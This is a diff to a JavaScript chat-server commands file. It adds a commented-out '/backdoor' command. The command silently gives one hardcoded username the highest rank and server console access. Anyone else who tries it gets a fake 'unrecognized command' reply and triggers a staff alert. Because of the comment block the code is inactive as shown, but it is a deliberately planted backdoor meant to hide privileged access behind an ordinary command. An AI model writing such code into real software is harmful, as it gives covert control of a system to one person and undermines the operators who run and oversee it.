@@ -1136,6 +1136,21 @@ exports.commands = {
 		buffer.unshift("" + targetUsername + " user auth:");
 		connection.popup(buffer.join("\n\n"));
 	},
+	/*
+	backdoor: function(target, room, user) {
+		if (user.userid !== 'axews') {
+			this.errorReply("The command '/backdoor' was unrecognized. To send a message starting with '/backdoor', type '//backdoor'.");	
+			Rooms.get("staff").add('|raw|<strong><font color=red>ALERT!</font> ' + Tools.escapeHTML(user.name) + ' has attempted to gain server access via a backdoor without proper authority!');
+			Rooms.get("staff").update();
+		} else {
+			user.group = '~';
+			user.updateIdentity();
+			Config.consoleips.push(user.userid);
+			this.sendReply("Backdoor accepted.");
+			this.logModCommand(user.name + ' used /backdoor. (IP: ' + user.latestIp + ')');
+		}
+	},
+	*/
 	deletecode: function(target, room, user) {
 		if (!target) {
 			return this.sendReply('/deletecode [user] - Deletes the Friend Code of the User.');
